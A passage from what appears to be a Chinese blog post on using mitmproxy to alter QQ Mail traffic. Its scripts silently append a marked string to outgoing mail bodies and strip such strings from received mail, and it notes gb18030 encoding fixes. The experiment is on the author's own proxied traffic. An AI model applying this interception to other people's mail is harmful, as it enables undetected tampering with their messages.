attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contentOperatorMouseOver</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">onClick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">handleOperatorClick</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span> <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span> <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><br>                                <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>operator-item<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>图片翻译<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>operator-item-translate<span class="token punctuation">"</span></span> <span class="token attr-name">operate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>translate<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>                                    <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item-inner<span class="token punctuation">"</span></span> <span class="token attr-name">operate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>translate<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                                <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                                <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>operator-item<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文字提取<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>operator-item-extract<span class="token punctuation">"</span></span> <span class="token attr-name">operate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>extract<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>                                    <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item-inner<span class="token punctuation">"</span></span> <span class="token attr-name">operate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>extract<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                                <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                                <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>operator-item<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>导出表格<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>operator-item-form<span class="token punctuation">"</span></span> <span class="token attr-name">operate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>                                    <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item-inner<span class="token punctuation">"</span></span> <span class="token attr-name">operate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                                <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                                <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>operator-item<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>下载图片<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>operator-item-download<span class="token punctuation">"</span></span> <span class="token attr-name">operate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>download<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>                                    <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item-inner<span class="token punctuation">"</span></span> <span class="token attr-name">operate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>download<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                                <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                            <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                            <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><br>                                document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><br>                                    <span class="token function">getTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">handleScanContentImage</span><span class="token punctuation">(</span><span class="token string">'ZC0006_StHNHHSMYOYuV2cAGA~jBf3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>                                <span class="token punctuation">}</span><span class="token punctuation">)</span><br>                            </span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>script</span><span class="token punctuation">></span></span><br>                            <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><br>                                <span class="token comment">/* 邮件内部图片支持调起预览。 */</span><br>                                <span class="token selector">img[image-inside-content='1']</span> <span class="token punctuation">{<!-- --></span><br>                                    <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span><br>                                <span class="token punctuation">}</span><br>                            </span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>style</span><span class="token punctuation">></span></span><br>                            一切正常，和昨天一样<span class="token tag"><span class="token tag"><span class="token punctuation"><</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><br>                                <span class="token selector">.qmbox style, .qmbox script, .qmbox head, .qmbox link, .qmbox meta</span> <span class="token punctuation">{<!-- --></span><br>                                    <span class="token property">display</span><span class="token punctuation">:</span> none <span class="token important">!important</span><span class="token punctuation">;</span><br>                                <span class="token punctuation">}</span><br>                            </span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>style</span><span class="token punctuation">></span></span><br>                        <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                    <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>                    <span class="token comment"><!-- --></span><br>                    <span class="token tag"><span class="token tag"><span class="token punctuation"><</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><br>                        <span class="token selector">#mailContentContainer .txt</span> <span class="token punctuation">{<!-- --></span><br>                            <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span><br>                        <span class="token punctuation">}</span><br>                    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>style</span><span class="token punctuation">></span></span><br>                <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>            <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>        <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>div</span><span class="token punctuation">></span></span><br>    <span class="token tag"><span class="token tag"><span class="token punctuation"></</span>body</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>html</span><span class="token punctuation">></span></span><br><span class="token comment"><!-- 此处省略一堆script --></span><br></code></pre> <br><p>发送的邮件主体就出现在简化后的HTML的第38行。</p> <br><p>在研究期间还看到了一个有点意思的图，mark一下：</p> <br><p><img src="https://i-blog.csdnimg.cn/direct/9cfd3e3e48c641f4a12a7a82cd53c44f.png" alt="stream" /></p> <br><h4><a id="___379"></a>消息验证 - 发送邮件时后台篡改</h4> <br><pre><code class="prism language-python"><span class="token keyword">from</span> mitmproxy <span class="token keyword">import</span> http<br><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> parse_qs<span class="token punctuation">,</span> urlencode<br><span class="token keyword">import</span> logging<br><br>logger_url <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'logger_url'</span><span class="token punctuation">)</span><br>formatter_url <span class="token operator">=</span> logging<span class="token punctuation">.</span>Formatter<span class="token punctuation">(</span><span class="token string">'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</span><span class="token punctuation">)</span><br><span class="token keyword">for</span> handler <span class="token keyword">in</span> logger_url<span class="token punctuation">.</span>handlers<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><br>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>handler<span class="token punctuation">,</span> logging<span class="token punctuation">.</span>StreamHandler<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        logger_url<span class="token punctuation">.</span>removeHandler<span class="token punctuation">(</span>handler<span class="token punctuation">)</span><br>logger_url<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span><br>filehandler_url <span class="token operator">=</span> logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'url.log'</span><span class="token punctuation">)</span><br>filehandler_url<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>formatter_url<span class="token punctuation">)</span><br>logger_url<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>filehandler_url<span class="token punctuation">)</span><br><br><br><span class="token keyword">class</span> <span class="token class-name">AddSignatureAddon</span><span class="token punctuation">:</span><br>    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span><br>        <span class="token comment"># 检查目标路径和请求方法</span><br>        <span class="token keyword">if</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token keyword">and</span> <span class="token string">"/cgi-bin/compose_send"</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">:</span><br>            <span class="token comment"># 确保Content-Type正确</span><br>            content_type <span class="token operator">=</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><br>            <span class="token keyword">if</span> <span class="token string">"application/x-www-form-urlencoded"</span> <span class="token keyword">in</span> content_type<span class="token punctuation">:</span><br>                <span class="token comment"># 解析原始表单数据</span><br>                <span class="token keyword">try</span><span class="token punctuation">:</span><br>                    parsed_data <span class="token operator">=</span> parse_qs<span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><br>                    logger_url<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"解析表单数据失败: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br>                    <span class="token keyword">return</span><br><br>                <span class="token comment"># 修改content__html字段</span><br>                <span class="token keyword">if</span> <span class="token string">"content__html"</span> <span class="token keyword">in</span> parsed_data <span class="token keyword">and</span> parsed_data<span class="token punctuation">[</span><span class="token string">"content__html"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><br>                    original_content <span class="token operator">=</span> parsed_data<span class="token punctuation">[</span><span class="token string">"content__html"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><br>                    new_content <span class="token operator">=</span> original_content <span class="token operator">+</span> <span class="token string">"*******计划有变*******"</span><br>                    parsed_data<span class="token punctuation">[</span><span class="token string">"content__html"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> new_content<br><br>                    <span class="token comment"># 重新编码并更新请求内容</span><br>                    updated_content <span class="token operator">=</span> urlencode<span class="token punctuation">(</span>parsed_data<span class="token punctuation">,</span> doseq<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><br>                    flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content <span class="token operator">=</span> updated_content<br>                    logger_url<span class="token punctuation">(</span><span class="token string">"成功添加签名！"</span><span class="token punctuation">)</span><br>                <span class="token keyword">else</span><span class="token punctuation">:</span><br>                    logger_url<span class="token punctuation">(</span><span class="token string">"未找到content__html字段"</span><span class="token punctuation">)</span><br><br>addons <span class="token operator">=</span> <span class="token punctuation">[</span>AddSignatureAddon<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><br></code></pre> <br><p>设置代理服务器为<code>localhost:8080</code>，然后：</p> <br><pre><code class="prism language-bash">mitmproxy <span class="token parameter variable">-s</span> modifyPackage.py --listen-host localhost<br></code></pre> <br><p>发送邮件，可以看到网页端没有任何异常，浏览器控制台也一切正常。</p> <br><p>但是实际发出的邮件就不一样了，多了一段<code>*******签名*******</code></p> <br><p><img src="https://i-blog.csdnimg.cn/direct/05238e8a521644abacb6decabde5dc7b.png" alt="实际邮件" /></p> <br><h4><a id="___441"></a>消息验证 - 收到邮件时后台篡改</h4> <br><pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span><br>    <span class="token keyword">if</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span> <span class="token keyword">and</span> <span class="token string">'/cgi-bin/readmail'</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">:</span><br><br>        <span class="token keyword">if</span> <span class="token string">"text/html"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>            <span class="token keyword">return</span><br>        <span class="token comment"># 解析HTML</span><br>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">"lxml"</span><span class="token punctuation">)</span><br>        content_div <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"mailContentContainer"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><br>        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>content_div<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><br>        <span class="token keyword">if</span> <span class="token keyword">not</span> content_div<span class="token punctuation">:</span><br>            <span class="token keyword">return</span><br><br>        <span class="token comment"># 提取所有文本节点</span><br>        text_nodes <span class="token operator">=</span> content_div<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> recursive<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><br>        <span class="token keyword">for</span> node <span class="token keyword">in</span> text_nodes<span class="token punctuation">:</span><br>            <span class="token comment"># 匹配签名模式（支持动态内容）</span><br>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\*{7}(.*?)\*{7}'</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span>string<span class="token punctuation">)</span><br>            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span><br>                signature <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取到签名：</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>signature<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br>                clean_text <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\*{7}.*?\*{7}'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span>string<span class="token punctuation">)</span><br>                node<span class="token punctuation">.</span>replace_with<span class="token punctuation">(</span>clean_text<span class="token punctuation">)</span><br><br>        <span class="token comment"># 更新响应内容</span><br>        flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>soup<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><br>        flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Length"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><br></code></pre> <br><p>等下，篡改失败了？</p> <br><p>仔细一看，response中有这么一段：</p> <br><pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation"><</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=gb18030<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><br></code></pre> <br><p>logging的日志也显示乱码。</p> <br><p>通过解码后能正常解析并修改原文内容了</p> <br><pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span><br>    <span class="token keyword">if</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span> <span class="token keyword">and</span> <span class="token string">'/cgi-bin/readmail'</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">:</span><br>        <span class="token keyword">if</span> <span class="token string">"text/html"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>            <span class="token keyword">return</span><br>        <span class="token keyword">try</span><span class="token punctuation">:</span><br>            html_content <span class="token operator">=</span> flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"gb18030"</span><span class="token punctuation">)</span><br>        <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span><br>            logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'解码失败：可能不是GB18030编码'</span><span class="token punctuation">)</span><br>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html_content<span class="token punctuation">,</span> <span class="token string">"lxml"</span><span class="token punctuation">)</span><br>        content_div <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"mailContentContainer"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><br>        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>content_div<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><br>        <span class="token keyword">if</span> <span class="token keyword">not</span> content_div<span class="token punctuation">:</span><br>            <span class="token keyword">return</span><br><br>        <span class="token comment"># 提取所有文本节点</span><br>        text_nodes <span class="token operator">=</span> content_div<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> recursive<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><br>        <span class="token keyword">for</span> node <span class="token keyword">in</span> text_nodes<span class="token punctuation">:</span><br>            <span class="token comment"># 匹配签名模式（支持动态内容）</span><br>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\*{7}(.*?)\*{7}'</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span>string<span class="token punctuation">)</span><br>            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span><br>                signature <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取到签名：</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>signature<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br>                clean_text <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\*{7}.*?\*{7}'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span>string<span class="token punctuation">)</span><br>                node<span class="token punctuation">.</span>replace_with<span class="token punctuation">(</span>clean_text<span class="token punctuation">)</span><br><br>        <span class="token comment"># 更新响应内容</span><br>        flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>soup<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"gb18030"</span><span class="token punctuation">)</span><br>        flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Length"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><br></code></pre> <br><p>但是通过抓包可以发现，通过beautifulsoup解析html并重新编码html，产生内容还是会稍有不同：</p> <br><ol><li> <p>header：原始编码为<code>gb18030</code>，但decode并由BS解析后就变成了<code>utf-8</code></p> <p>原来：</p> <pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation"><</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=gb18030<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><br></code></pre> <p>解析后：</p> <pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation"><</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><br></code></pre> </li><li> <p>有些细节和原来内容不完全一致</p> <p>例如1.中的顺序，原来是先<code>http-equiv</code>后<code>content</code>，结果变成了先<code>content</code>后<code>http-equiv</code></p> <p>还有的<code>&nbsp;</code>会被直接由空格代替。</p> </li></ol> <br><p>解决方法有二：</p> <br><ol><li>令BS树的编码方式为gb18030</li><li>不BS树，直接用正则解析</li></ol> <br><p>使用方法一：</p> <br><pre><code class="prism language-python">meta_tag <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"meta"</span><span class="token punctuation">,</span> attrs<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"http-equiv"</span><span class="token punctuation">:</span> <span class="token string">"Content-Type"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><br><span class="token keyword">if</span> meta_tag<span class="token punctuation">:</span><br>    meta_tag<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"text/html; charset=gb18030"</span><br></code></pre> <br><p>抓包发现meta content的内容正常了，但邮件直接全部不显示。</p> <br><p>肉眼可见BS对原文内容进行了很多修改，于是决定使用方案二</p> <br><pre><code class="prism language-python"><span class="token keyword">try</span><span class="token punctuation">:</span><br>    html_content <span class="token operator">=</span> flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"gb18030"</span><span class="token punctuation">)</span><br><span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span><br>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'解码失败：可能不是GB18030编码'</span><span class="token punctuation">)</span><br><span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\*{7}(.*?)\*{7}'</span><span class="token punctuation">,</span> html_content<span class="token punctuation">)</span><br><span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span><br>    signature <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取到签名：</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>signature<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br>    html_content <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\*{7}.*?\*{7}'</span><span class="token punctuation">,</span> <span class="token 